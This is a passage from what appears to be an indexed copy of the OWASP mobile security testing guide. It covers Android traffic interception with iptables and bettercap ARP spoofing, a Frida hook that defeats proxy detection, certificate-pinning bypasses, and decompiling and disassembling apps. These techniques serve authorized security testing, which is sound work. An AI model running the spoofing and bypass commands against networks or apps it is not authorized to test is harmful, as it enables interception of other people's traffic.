to finally being able to see the traffic. In the sections below we are describing two different solutions, bettercap and iptables.</p> <p>You could also use an access point that is under your control to redirect the traffic, but this would require additional hardware and we focus for now on software solutions.</p> <p>For both solutions you need to activate \"Support invisible proxying\" in Burp, in Proxy Tab/Options/Edit Interface.</p>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0011/#iptables","title":"iptables","text":"<p>You can use iptables on the Android device to redirect all traffic to your interception proxy. The following command would redirect port 80 to your proxy running on port 8080</p> <pre><code>iptables -t nat -A OUTPUT -p tcp --dport 80 -j DNAT --to-destination &lt;Your-Proxy-IP&gt;:8080\n</code></pre> <p>Verify the iptables settings and check the IP and port.</p> <pre><code>$ iptables -t nat -L\nChain PREROUTING (policy ACCEPT)\ntarget     prot opt source               destination\n\nChain INPUT (policy ACCEPT)\ntarget     prot opt source               destination\n\nChain OUTPUT (policy ACCEPT)\ntarget     prot opt source               destination\nDNAT       tcp  --  anywhere             anywhere             tcp dpt:5288 to:&lt;Your-Proxy-IP&gt;:8080\n\nChain POSTROUTING (policy ACCEPT)\ntarget     prot opt source               destination\n\nChain natctrl_nat_POSTROUTING (0 references)\ntarget     prot opt source               destination\n\nChain oem_nat_pre (0 references)\ntarget     prot opt source               destination\n</code></pre> <p>In case you want to reset the iptables configuration you can flush the rules:</p> <pre><code>iptables -t nat -F\n</code></pre>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0011/#bettercap","title":"bettercap","text":"<p>See  Achieving a MITM Position via ARP Spoofing for further preparation and instructions for running bettercap.</p> <p>The host computer where you run your proxy and the Android device must be connected to the same wireless network. Start bettercap with the following command, replacing the IP address below (X.X.X.X) with the IP address of your Android device.</p> <pre><code>$ sudo bettercap -eval \"set arp.spoof.targets X.X.X.X; arp.spoof on; set arp.spoof.internal true; set arp.spoof.fullduplex true;\"\nbettercap v2.22 (built for darwin amd64 with go1.12.1) [type 'help' for a list of commands]\n\n[19:21:39] [sys.log] [inf] arp.spoof enabling forwarding\n[19:21:39] [sys.log] [inf] arp.spoof arp spoofer started, probing 1 targets.\n</code></pre>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0011/#proxy-detection","title":"Proxy Detection","text":"<p>Some mobile apps are trying to detect if a proxy is set. If that's the case they will assume that this is malicious and will not work properly.</p> <p>In order to bypass such a protection mechanism you could either setup bettercap or configure iptables that don't need a proxy setup on your Android phone. A third option we didn't mention before and that is applicable in this scenario is using Frida. It is possible on Android to detect if a system proxy is set by querying the <code>ProxyInfo</code> class and check the getHost() and getPort() methods. There might be various other methods to achieve the same task and you would need to decompile the APK in order to identify the actual class and method name.</p> <p>Below you can find boiler plate source code for a Frida script that will help you to overload the method (in this case called isProxySet) that is verifying if a proxy is set and will always return false. Even if a proxy is now configured the app will now think that none is set as the function returns false.</p> <pre><code>setTimeout(function(){\n    Java.perform(function (){\n        console.log(\"[*] Script loaded\")\n\n        var Proxy = Java.use(\"&lt;package-name&gt;.&lt;class-name&gt;\")\n\n        Proxy.isProxySet.overload().implementation = function() {\n            console.log(\"[*] isProxySet function invoked\")\n            return false\n        }\n    });\n});\n</code></pre>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0012/","title":"MASTG-TECH-0012: Bypassing Certificate Pinning","text":"<p>Some applications will implement SSL Pinning, which prevents the application from accepting your intercepting certificate as a valid certificate. This means that you will not be able to monitor the traffic between the application and the server.</p> <p>For most applications, certificate pinning can be bypassed within seconds, but only if the app uses the API functions that are covered by these tools. If the app is implementing SSL Pinning with a custom framework or library, the SSL Pinning must be manually patched and deactivated, which can be time-consuming.</p> <p>This section describes various ways to bypass SSL Pinning and gives guidance about what you should do when the existing tools don't help.</p>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0012/#bypassing-methods","title":"Bypassing Methods","text":"<p>There are several ways to bypass certificate pinning for a black box test, depending on the frameworks available on the device:</p> <ul> <li>Frida: Use  frida-multiple-unpinning</li> <li>Objection: Use the <code>android sslpinning disable</code> command.</li> <li>Xposed: Install the TrustMeAlready or the  SSLUnpinning module.</li> </ul> <p>If you have a rooted device with frida-server installed, you can bypass SSL pinning by running the following  objection command (see  Repackaging Apps if you're using a non-rooted device):</p> <pre><code>android sslpinning disable\n</code></pre> <p>Here's an example of the output:</p> <p></p> <p>See also Objection's help on Disabling SSL Pinning for Android for further information and inspect the pinning.ts file to understand how the bypass works.</p> <p>Note that the frida-multiple-unpinning script from  Frida CodeShare covers more scenarios than the Objection script.</p>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0012/#bypass-custom-certificate-pinning-statically","title":"Bypass Custom Certificate Pinning Statically","text":"<p>Somewhere in the application, both the endpoint and the certificate (or its hash) must be defined. After decompiling the application, you can search for:</p> <ul> <li>Certificate hashes: <code>grep -ri \"sha256\\|sha1\" ./smali</code>. Replace the identified hashes with the hash of your proxy's CA. Alternatively, if the hash is accompanied by a domain name, you can try modifying the domain name to a non-existing domain so that the original domain is not pinned. This works well on obfuscated OkHTTP implementations.</li> <li>Certificate files: <code>find ./assets -type f \\( -iname \\*.cer -o -iname \\*.crt \\)</code>. Replace these files with your proxy's certificates, making sure they are in the correct format.</li> <li>Truststore files: <code>find ./ -type f \\( -iname \\*.jks -o -iname \\*.bks \\)</code>. Add your proxy's certificates to the truststore and make sure they are in the correct format.</li> </ul> <p>Keep in mind that an app might contain files without extension. The most common file locations are <code>assets</code> and <code>res</code> directories, which should also be investigated.</p> <p>As an example, let's say that you find an application which uses a BKS (BouncyCastle) truststore and it's stored in the file <code>res/raw/truststore.bks</code>. To bypass SSL Pinning you need to add your proxy's certificate to the truststore with the command line tool <code>keytool</code>. <code>Keytool</code> comes with the Java SDK and the following values are needed to execute the command:</p> <ul> <li>password - Password for the keystore. Look in the decompiled app code for the hardcoded password.</li> <li>providerpath - Location of the BouncyCastle Provider jar file. You can download it from The Legion of the Bouncy Castle.</li> <li>proxy.cer - Your proxy's certificate.</li> <li>aliascert - Unique value which will be used as alias for your proxy's certificate.</li> </ul> <p>To add your proxy's certificate use the following command:</p> <pre><code>keytool -importcert -v -trustcacerts -file proxy.cer -alias aliascert -keystore \"res/raw/truststore.bks\" -provider org.bouncycastle.jce.provider.BouncyCastleProvider -providerpath \"providerpath/bcprov-jdk15on-164.jar\" -storetype BKS -storepass password\n</code></pre> <p>To list certificates in the BKS truststore use the following command:</p> <pre><code>keytool -list -keystore \"res/raw/truststore.bks\" -provider org.bouncycastle.jce.provider.BouncyCastleProvider -providerpath \"providerpath/bcprov-jdk15on-164.jar\"  -storetype BKS -storepass password\n</code></pre> <p>After making these modifications, repackage the application using apktool and install it on your device.</p> <p>If the application uses native libraries to implement network communication, further reverse engineering is needed. An example of such an approach can be found in the blog post Identifying the SSL Pinning logic in smali code, patching it, and reassembling the APK</p>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0012/#bypass-custom-certificate-pinning-dynamically","title":"Bypass Custom Certificate Pinning Dynamically","text":"<p>Bypassing the pinning logic dynamically makes it more convenient as there is no need to bypass any integrity checks and it's much faster to perform trial &amp; error attempts.</p> <p>Finding the correct method to hook is typically the hardest part and can take quite some time depending on the level of obfuscation. As developers typically reuse existing libraries, it is a good approach to search for strings and license files that identify the used library. Once the library has been identified, examine the non-obfuscated source code to find methods which are suited for dynamic instrumentation.</p> <p>As an example, let's say that you find an application which uses an obfuscated OkHTTP3 library. The documentation shows that the <code>CertificatePinner.Builder</code> class is responsible for adding pins for specific domains. If you can modify the arguments to the Builder.add method, you can change the hashes to the correct hashes belonging to your certificate. Finding the correct method can be done in either two ways, as explained in this blog post by Jeroen Beckers:</p> <ul> <li>Search for hashes and domain names as explained in the previous section. The actual pinning method will typically be used or defined in close proximity to these strings</li> <li>Search for the method signature in the SMALI code</li> </ul> <p>For the Builder.add method, you can find the possible methods by running the following grep command: <code>grep -ri java/lang/String;\\[Ljava/lang/String;)L ./</code></p> <p>This command will search for all methods that take a string and a variable list of strings as arguments, and return a complex object. Depending on the size of the application, this may have one or multiple matches in the code.</p> <p>Hook each method with Frida and print the arguments. One of them will print out a domain name and a certificate hash, after which you can modify the arguments to circumvent the implemented pinning.</p>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0013/","title":"MASTG-TECH-0013: Reverse Engineering Android Apps","text":"<p>Android's openness makes it a favorable environment for reverse engineers, offering big advantages that are not available with iOS. Because Android is open-source, you can study its source code at the Android Open Source Project (AOSP) and modify the OS and its standard tools any way you want. Even on standard retail devices, it is possible to do things like activating developer mode and sideloading apps without jumping through many hoops. From the powerful tools shipping with the SDK to the wide range of available reverse engineering tools, there's a lot of niceties to make your life easier.</p> <p>However, there are also a few Android-specific challenges. For example, you'll need to deal with both Java bytecode and native code. Java Native Interface (JNI) is sometimes deliberately used to confuse reverse engineers (to be fair, there are legitimate reasons for using JNI, such as improving performance or supporting legacy code). Developers sometimes use the native layer to \"hide\" data and functionality, and they may structure their apps such that execution frequently jumps between the two layers.</p> <p>You'll need at least a working knowledge of both the Java-based Android environment and the Linux OS and Kernel, on which Android is based. You'll also need the right toolset to deal with both the bytecode running on the Java virtual machine and the native code.</p>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0014/","title":"MASTG-TECH-0014: Static Analysis on Android","text":"<p>Static analysis is a technique used to examine and evaluate the source code of a mobile application without executing it. This method is instrumental in identifying potential security vulnerabilities, coding errors, and compliance issues. Static analysis tools can scan the entire codebase automatically, making them a valuable asset for developers and security auditors.</p> <p>Two good examples of static analysis tools are grep and  semgrep. However, there are many other tools available, and you should choose the one that best fits your needs.</p>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0014/#example-using-grep-for-manifest-analysis-in-android-apps","title":"Example: Using grep for Manifest Analysis in Android Apps","text":"<p>One simple yet effective use of static analysis is using the <code>grep</code> command-line tool to inspect the <code>AndroidManifest.xml</code> file of an Android app. For example, you can extract the minimum SDK version (which indicates the lowest version of Android the app supports) with the following <code>grep</code> command:</p> <pre><code>grep 'android:minSdkVersion' AndroidManifest.xml\n</code></pre> <p>This command searches for the <code>android:minSdkVersion</code> attribute within the manifest file. Ensuring a higher <code>minSdkVersion</code> can reduce security risks, as older versions of Android may not include the latest security features and fixes.</p>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0014/#example-using-semgrep-for-identifying-seeds-with-insufficient-entropy","title":"Example: Using semgrep for Identifying Seeds With Insufficient Entropy","text":"<p>semgrep is a more advanced tool that can be used for pattern matching in code. It's particularly useful for identifying complex coding patterns that might lead to security vulnerabilities. For example, to find instances where a deterministic seed is used with the <code>SecureRandom</code> class (which can compromise the randomness and thus the security), you can use a semgrep rule like:</p> <pre><code>rules:\n  - id: insecure-securerandom-seed\n    patterns:\n      - pattern: new SecureRandom($SEED)\n      - pattern-not: $SEED = null\n    message: \"Using a deterministic seed with SecureRandom. Consider using a more secure seed.\"\n    languages: [java]\n    severity: WARNING\n</code></pre> <p>This rule will flag any instances in the code where <code>SecureRandom</code> is initialized with a specific seed, excluding cases where the seed is null (which implies a secure random seed).</p>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0015/","title":"MASTG-TECH-0015: Dynamic Analysis on Android","text":"<p>TBD</p>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0016/","title":"MASTG-TECH-0016: Disassembling Code to Smali","text":"<p>If you want to inspect the app's smali code (instead of Java), you can open your APK in Android Studio by clicking Profile or debug APK from the \"Welcome screen\" (even if you don't intend to debug it you can take a look at the smali code).</p> <p>Alternatively you can use  Apktool to extract and disassemble resources directly from the APK archive and disassemble Java bytecode to smali. apktool allows you to reassemble the package, which is useful for  Patching the app or applying changes to e.g. the Android Manifest.</p>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0017/","title":"MASTG-TECH-0017: Decompiling Java Code","text":"<p>When reverse-engineering an Android application, make sure to always identify all locations of interest in regards to application logic and use the correct techniques to reverse-engineer them. In this technique we'll focus on the DEX bytecode, which is stored in one or more <code>classes&lt;x&gt;.dex</code> files in the main directory of the APK. But Android applications may also contain code in other files which will be interpreted by either a system component (e.g. a <code>WebView</code>) or packaged native libraries.</p> <p>Decompiling DEX bytecode into Java is typically an easy process and many decompilers exist that can deliver code that is near-identical to the original source code. However, some information is inherently always lost during compilation, so the retrieved code will never be a perfect match. However, if the code has been purposefully obfuscated (or some tool-breaking anti-decompilation tricks have been applied), the reverse engineering process may be very time-consuming and unproductive. This also applies to applications that contain native code. They can still be reverse engineered, but the process cannot be trivially automated and requires knowledge of low-level details.</p> <p>While DEX bytecode and Java bytecode are not the same, they can be converted into each other. As a result, Android applications can be decompiled using Java decompilers by first converting the <code>.dex</code> files into <code>.jar</code> files and then decompiling the <code>.jar</code> files. Since one application can have multiple <code>.dex</code>, this is a tedious process, and luckily many decompilers have native support for <code>.apk</code> files, thereby taking care of this process for you. Some decompilers also work directly on DEX bytecode, rather than converting it into Java bytecode first.</p> <p>Due to the long legacy of Java applications, many decompilers can be used to decompile Android applications. While some very strong commercial Android decompilers exist, there are free decompilers which rival commercial decompilers in many aspects. The most popular free decompiler is  jadx, which is actively developed. If jadx fails to decompile a part of the code, the easiest alternative is  Bytecode Viewer, which combines six different decompilers in one application (JD-GUI, Procyon, CFR, Fernflower, Krakatau and JADX-Core). Both of these decompilers have native support for <code>.apk</code> files, and while it may seem that bytecodeviewer is the better choice, jadx has many more UI features that offer a much more pleasant user experience than bytecodeviewer.</p> <p>Warning</p> <p>Decompilation can always fail, either due to intentional manipulation of the <code>.dex</code> files, or simply due to bugs in the decompilers. If all decompilers fail, you can always fall back to  Disassembling Code to Smali.</p> <p>Let's take a look at the decompiled version of  Android UnCrackable L1 in a few different decompilers:</p>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0017/#using-jadx-gui","title":"Using jadx-gui","text":"<p>You can open an APK file either by launching <code>jadx-gui</code> and using the GUI, or by directly specifying the APK when launching jadx-gui:</p> <pre><code>jadx-gui Uncrackable-Level1.apk\n</code></pre> <p></p> <p>Jadx-gui usually does very well when decompiling Android applications. If decompilation is unsuccessful, it also supports multiple fallback modes which can be toggled at the bottom of the pane (SMALI, Simple, Fallback)</p>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0017/#using-jadx","title":"Using jadx","text":"<p>In addition to opening the binary with jadx-gui, it's also possible to use jadx's core to decompile the code to the filesystem. Afterwards, you can use your favorite code editor to examine the code:</p> <pre><code>jadx -d decompiled UnCrackable-Level1.apk\n</code></pre> <p>It's possible to specify which class to decompile, rather than decompile the entire application. This can be done with the <code>--single-class</code> argument:</p> <pre><code>jadx --single-class sg.vantagepoint.uncrackable1.MainActivity UnCrackable-Level1.apk \nINFO  - loading ...\nINFO  - Saving class 'sg.vantagepoint.uncrackable1.MainActivity' to file '/home/owasp/UnCrackable-Level1/sources/sg/vantagepoint/uncrackable1/MainActivity.java'\nINFO  - done\n</code></pre> <p>Jadx also has a feature that allows you to create a gradle project from the decompiled code. This gradle project can then be opened with  Android Studio. Note that you won't be able to actually compile the application due to the loss of information during the original compilation, but you can still use Android Studio's powerful IDE features to analyze the decompiled code.</p> <pre><code>jadx -d decompiled -e UnCrackable-Level1.apk\n</code></pre>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0017/#using-bytecodeviewer","title":"Using Bytecodeviewer","text":"<p>Bytecodeviewer can show different decompilers side by side. In the example above, Fernflower and CFR are shown. Even though the code is equivalent, there are differences between the two decompilation results. For example, CFR tends to use available type information when naming variables, while Fernflower simply uses <code>var{index}</code>.</p> <p>See the section  Reviewing Decompiled Java Code to learn how to proceed when inspecting the decompiled Java code.</p>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0018/","title":"MASTG-TECH-0018: Disassembling Native Code","text":"<p>Dalvik and ART both support the Java Native Interface (JNI), which defines a way for Java code to interact with native code written in C/C++. As on other Linux-based operating systems, native code is packaged (compiled) into ELF dynamic libraries (*.so), which the Android app loads at runtime via the <code>System.load</code> method. However, instead of relying on widely used C libraries (such as glibc), Android binaries are built against a custom libc named Bionic. Bionic adds support for important Android-specific services such as system properties and logging, and it is not fully POSIX-compatible.</p> <p>When reversing an Android application containing native code, we need to understand a couple of data structures related to the JNI bridge between Java and native code. From the reversing perspective, we need to be aware of two key data structures: <code>JavaVM</code> and <code>JNIEnv</code>. Both of them are pointers to pointers to function tables:</p> <ul> <li><code>JavaVM</code> provides an interface to invoke functions for creating and destroying a JavaVM. Android allows only one <code>JavaVM</code> per process and is not really relevant for our reversing purposes.</li> <li><code>JNIEnv</code> provides access to most of the JNI functions which are accessible at a fixed offset through the <code>JNIEnv</code> pointer. This <code>JNIEnv</code> pointer is the first parameter passed to every JNI function. We will discuss this concept again with the help of an example later in this chapter.</li> </ul> <p>It is worth highlighting that analyzing disassembled native code is much more challenging than disassembled Java code. When reversing the native code in an Android application we will need a disassembler.</p> <p>In the next example we'll reverse the HelloWorld-JNI.apk from the OWASP MASTG repository. Installing and running it in an emulator or Android device is optional.</p> <pre><code>wget https://github.com/OWASP/mastg/raw/master/Samples/Android/01_HelloWorld-JNI/HelloWord-JNI.apk\n</code></pre> <p>This app is not exactly spectacular, all it does is show a label with the text \"Hello from C++\". This is the app Android generates by default when you create a new project with C/C++ support, which is just enough to show the basic principles of JNI calls.</p> <p></p> <p>Decompile the APK with <code>apkx</code>.</p> <pre><code>$ apkx HelloWord-JNI.apk\nExtracting HelloWord-JNI.apk to HelloWord-JNI\nConverting: classes.dex -&gt; classes.jar (dex2jar)\ndex2jar HelloWord-JNI/classes.dex -&gt; HelloWord-JNI/classes.jar\nDecompiling to HelloWord-JNI/src (cfr)\n</code></pre> <p>This extracts the source code into the <code>HelloWord-JNI/src</code> directory. The main activity is found in the file <code>HelloWord-JNI/src/sg/vantagepoint/helloworldjni/MainActivity.java</code>. The \"Hello World\" text view is populated in the <code>onCreate</code> method:</p> <pre><code>public class MainActivity\nextends AppCompatActivity {\n    static {\n        System.loadLibrary(\"native-lib\");\n    }\n\n    @Override\n    protected void onCreate(Bundle bundle) {\n        super.onCreate(bundle);\n        this.setContentView(2130968603);\n        ((TextView)this.findViewById(2131427422)).setText((CharSequence)this. \\\n        stringFromJNI());\n    }\n\n    public native String stringFromJNI();\n}\n</code></pre> <p>Note the declaration of <code>public native String stringFromJNI</code> at the bottom. The keyword \"native\" tells the Java compiler that this method is implemented in a native language. The corresponding function is resolved during runtime, but only if a native library that exports a global symbol with the expected signature is loaded (signatures comprise a package name, class name, and method name). In this example, this requirement is satisfied by the following C or C++ function:</p> <pre><code>JNIEXPORT jstring JNICALL Java_sg_vantagepoint_helloworld_MainActivity_stringFromJNI(JNIEnv *env, jobject)\n</code></pre> <p>So where is the native implementation of this function? If you look into the \"lib\" directory of the unzipped APK archive, you'll see several subdirectories (one per supported processor architecture), each of them containing a version of the native library, in this case <code>libnative-lib.so</code>. When <code>System.loadLibrary</code> is called, the loader selects the correct version based on the device that the app is running on. Before moving ahead, pay attention to the first parameter passed to the current JNI function. It is the same <code>JNIEnv</code> data structure which was discussed earlier in this section.</p> <p></p> <p>Following the naming convention mentioned above, you can expect the library to export a symbol called <code>Java_sg_vantagepoint_helloworld_MainActivity_stringFromJNI</code>. On Linux systems, you can retrieve the list of symbols with <code>readelf</code> (included in GNU binutils) or <code>nm</code>. Do this on macOS with the <code>greadelf</code> tool, which you can install via Macports or Homebrew. The following example uses <code>greadelf</code>:</p> <pre><code>$ greadelf -W -s libnative-lib.so | grep Java\n     3: 00004e49   112 FUNC    GLOBAL DEFAULT   11 Java_sg_vantagepoint_helloworld_MainActivity_stringFromJNI\n</code></pre> <p>You can also see this using radare2's  rabin2:</p> <pre><code>$ rabin2 -s HelloWord-JNI/lib/armeabi-v7a/libnative-lib.so | grep -i Java\n003 0x00000e78 0x00000e78 GLOBAL   FUNC   16 Java_sg_vantagepoint_helloworldjni_MainActivity_stringFromJNI\n</code></pre> <p>This is the native function that eventually gets executed when the <code>stringFromJNI</code> native method is called.</p> <p>To disassemble the code, you can load <code>libnative-lib.so</code> into any disassembler that understands ELF binaries (i.e., any disassembler). If the app ships with binaries for different architectures, you can theoretically pick the architecture you're most familiar with, as long as it is compatible with the disassembler. Each version is compiled from the same source and implements the same functionality. However, if you're planning to debug the library on a live device later, it's usually wise to pick an ARM build.</p> <p>To support both older and newer ARM processors, Android apps ship with multiple ARM builds compiled for different Application Binary Interface (ABI) versions. The ABI defines how the application's machine code is supposed to interact with the system at runtime. The following ABIs are supported:</p> <ul> <li>armeabi: ABI is for ARM-based CPUs that support at least the ARMv5TE instruction set.</li> <li>armeabi-v7a: This ABI extends armeabi to include several CPU instruction set extensions.</li> <li>arm64-v8a: ABI for ARMv8-based CPUs that support AArch64, the new 64-bit ARM architecture.</li> </ul> <p>Most disassemblers can handle any of those architectures. Below, we'll be viewing the armeabi-v7a version (located in <code>HelloWord-JNI/lib/armeabi-v7a/libnative-lib.so</code>) in radare2 and in IDA Pro. See  Reviewing Disassembled Native Code to learn on how to proceed when inspecting the disassembled native code.</p>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0018/#radare2","title":"radare2","text":"<p>To open the file in  radare2 for Android you only have to run <code>r2 -A HelloWord-JNI/lib/armeabi-v7a/libnative-lib.so</code>. The chapter \"Android Basic Security Testing\" already introduced radare2. Remember that you can use the flag <code>-A</code> to run the <code>aaa</code> command right after loading the binary in order to analyze all referenced code.</p> <pre><code>$ r2 -A HelloWord-JNI/lib/armeabi-v7a/libnative-lib.so\n\n[x] Analyze all flags starting with sym. and entry0 (aa)\n[x] Analyze function calls (aac)\n[x] Analyze len bytes of instructions for references (aar)\n[x] Check for objc references\n[x] Check for vtables\n[x] Finding xrefs in noncode section with anal.in=io.maps\n[x] Analyze value pointers (aav)\n[x] Value from 0x00000000 to 0x00001dcf (aav)\n[x] 0x00000000-0x00001dcf in 0x0-0x1dcf (aav)\n[x] Emulate code to find computed references (aae)\n[x] Type matching analysis for all functions (aaft)\n[x] Use -AA or aaaa to perform additional experimental analysis.\n -- Print the contents of the current block with the 'p' command\n[0x00000e3c]&gt;\n</code></pre> <p>Note that for bigger binaries, starting directly with the flag <code>-A</code> might be very time consuming as well as unnecessary. Depending on your purpose, you may open the binary without this option and then apply a less complex analysis like <code>aa</code> or a more concrete type of analysis such as the ones offered in <code>aa</code> (basic analysis of all functions) or <code>aac</code> (analyze function calls). Remember to always type <code>?</code> to get the help or attach it to commands to see even more command or options. For example, if you enter <code>aa?</code> you'll get the full list of analysis commands.</p> <pre><code>[0x00001760]&gt; aa?\nUsage: aa[0*?]   # see also 'af' and 'afna'\n| aa                  alias for 'af@@ sym.*;af@entry0;afva'\n| aaa[?]              autoname functions after aa (see afna)\n| aab                 abb across bin.sections.rx\n| aac [len]           analyze function calls (af @@ `pi len~call[1]`)\n| aac* [len]          flag function calls without performing a complete analysis\n| aad [len]           analyze data references to code\n| aae [len] ([addr])  analyze references with ESIL (optionally to address)\n| aaf[e|t]            analyze all functions (e anal.hasnext=1;afr @@c:isq) (aafe=aef@@f)\n| aaF [sym*]          set anal.in=block for all the spaces between flags matching glob\n| aaFa [sym*]         same as aaF but uses af/a2f instead of af+/afb+ (slower but more accurate)\n| aai[j]              show info of all analysis parameters\n| aan                 autoname functions that either start with fcn.* or sym.func.*\n| aang                find function and symbol names from golang binaries\n| aao                 analyze all objc references\n| aap                 find and analyze function preludes\n| aar[?] [len]        analyze len bytes of instructions for references\n| aas [len]           analyze symbols (af @@= `isq~[0]`)\n| aaS                 analyze all flags starting with sym. (af @@ sym.*)\n| aat [len]           analyze all consecutive functions in section\n| aaT [len]           analyze code after trap-sleds\n| aau [len]           list mem areas (larger than len bytes) not covered by functions\n| aav [sat]           find values referencing a specific section or map\n</code></pre> <p>There is a thing that is worth noticing about radare2 vs other disassemblers like e.g. IDA Pro. The following quote from this article of radare2's blog (https://radareorg.github.io/blog/) offers a good summary.</p> <p>Code analysis is not a quick operation, and not even predictable or taking a linear time to be processed. This makes starting times pretty heavy, compared to just loading the headers and strings information like it's done by default.</p> <p>People that are used to IDA Pro or Hopper just load the binary, go out to make a coffee and then when the analysis is done, they start doing the manual analysis to understand what the program is doing. It's true that those tools perform the analysis in background, and the GUI is not blocked. But this takes a lot of CPU time, and r2 aims to run in many more platforms than just high-end desktop computers.</p> <p>This said, please see  Reviewing Disassembled Native Code to learn more bout how radare2 can help us performing our reversing tasks much faster. For example, getting the disassembly of a specific function is a trivial task that can be performed in one command.</p>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0018/#ida-pro","title":"IDA Pro","text":"<p>If you own an IDA Pro license, open the file and once in the \"Load new file\" dialog, choose \"ELF for ARM (Shared Object)\" as the file type (IDA should detect this automatically), and \"ARM Little-Endian\" as the processor type.</p> <p></p> <p>The freeware version of IDA Pro unfortunately does not support the ARM processor type.</p>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0019/","title":"MASTG-TECH-0019: Retrieving Strings","text":"<p>While performing any kind of binary analysis, strings can be considered as one of the most valuable starting points as they provide context. For example, an error log string like \"Data encryption failed.\" gives us a hint that the adjoining code might be responsible for performing some kind of encryption operation.</p>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0019/#java-and-kotlin-bytecode","title":"Java and Kotlin Bytecode","text":"<p>As we already know, all the Java and Kotlin bytecode of an Android application is compiled into a DEX file. Each DEX file contains a list of string identifiers (strings_ids), which contains all the string identifiers used in the binary whenever a string is referred, including internal naming (e.g, type descriptors) or constant objects referred by the code (e.g hardcoded strings). You can simply dump this list using tools such as Ghidra (GUI based) or Dextra (CLI based).</p> <p>With Ghidra, strings can be obtained by simply loading the DEX file and selecting Window -&gt; Defined strings in the menu.</p> <p>Loading an APK file directly into Ghidra might lead to inconsistencies. Thus it is recommended to extract the DEX file by unzipping the APK file and then loading it into Ghidra.</p> <p></p> <p>With Dextra, you can dump all the strings using the following command:</p> <pre><code>dextra -S classes.dex\n</code></pre> <p>The output from Dextra can be manipulated using standard Linux commands, for example, using <code>grep</code> to search for certain keywords.</p> <p>It is important to know, the list of strings obtained using the above tools can be very big, as it also includes the various class and package names used in the application. Going through the complete list, specially for big binaries, can be very cumbersome. Thus, it is recommended to start with keyword-based searching and go through the list only when keyword search does not help. Some generic keywords which can be a good starting point are - password, key, and secret. Other useful keywords specific to the context of the app can be obtained while you are using the app itself. For instance, imagine that the app has as login form, you can take note of the displayed placeholder or title text of the input fields and use that as an entry point for your static analysis.</p>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0019/#native-code","title":"Native Code","text":"<p>In order to extract strings from native code used in an Android application, you can use GUI tools such as Ghidra or iaito or rely on CLI-based tools such as the strings Unix utility (<code>strings &lt;path_to_binary&gt;</code>) or radare2's  rabin2 (<code>rabin2 -zz &lt;path_to_binary&gt;</code>). When using the CLI-based ones you can take advantage of other tools such as grep (e.g. in conjunction with regular expressions) to further filter and analyze the results.</p>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0020/","title":"MASTG-TECH-0020: Retrieving Cross References","text":"","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0020/#java-and-kotlin","title":"Java and Kotlin","text":"<p>There are many RE tools that support retrieving Java cross references. For many of the GUI-based ones, this is usually done by right clicking on the desired function and selecting the corresponding option, e.g. Show References to in Ghidra or Find Usage in  jadx.</p>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0020/#native-code","title":"Native Code","text":"<p>Similarly to Java analysis, you can also use Ghidra to analyze native libraries and obtain cross references by right clicking the desired function and selecting Show References to.</p>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0021/","title":"MASTG-TECH-0021: Information Gathering - API Usage","text":"<p>The Android platform provides many in-built libraries for frequently used functionalities in applications, for example cryptography, Bluetooth, NFC, network or location libraries. Determining the presence of these libraries in an application can give us valuable information about its nature.</p> <p>For instance, if an application is importing <code>javax.crypto.Cipher</code>, it indicates that the application will be performing some kind of cryptographic operation. Fortunately, cryptographic calls are very standard in nature, i.e, they need to be called in a particular order to work correctly, this knowledge can be helpful when analyzing cryptography APIs. For example, by looking for the <code>Cipher.getInstance</code> function, we can determine the cryptographic algorithm being used. With such an approach we can directly move to analyzing cryptographic assets, which often are very critical in an application. Further information on how to analyze Android's cryptographic APIs is discussed in the section \"Android Cryptographic APIs\".</p> <p>Similarly, the above approach can be used to determine where and how an application is using NFC. For instance, an application using Host-based Card Emulation for performing digital payments must use the <code>android.nfc</code> package. Therefore, a good starting point for NFC API analysis would be to consult the Android Developer Documentation to get some ideas and start searching for critical functions such as <code>processCommandApdu</code> from the <code>android.nfc.cardemulation.HostApduService</code> class.</p>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0022/","title":"MASTG-TECH-0022: Information Gathering - Network Communication","text":"<p>Most of the apps you might encounter connect to remote endpoints. Even before you perform any dynamic analysis (e.g. traffic capture and analysis), you can obtain some initial inputs or entry points by enumerating the domains to which the application is supposed to communicate to.</p> <p>Typically, these domains will be present as strings within the binary of the application. One way to do this is to use automated tools such as  Apkleaks or  MobSF.</p> <p>Alternatively, you can grep for the domain names using regular expressions. To do this, you can target the app binary directly, or reverse engineer it and target the disassembled or decompiled code. The latter option has a clear advantage: it can provide you with context, as you'll be able to see in which context each domain is used (e.g. class and method).</p> <p>From here on you can use this information to derive more insights which might be of use later during your analysis, e.g. you could match the domains to the pinned certificates or the Network Security Configuration file or perform further reconnaissance on domain names to know more about the target 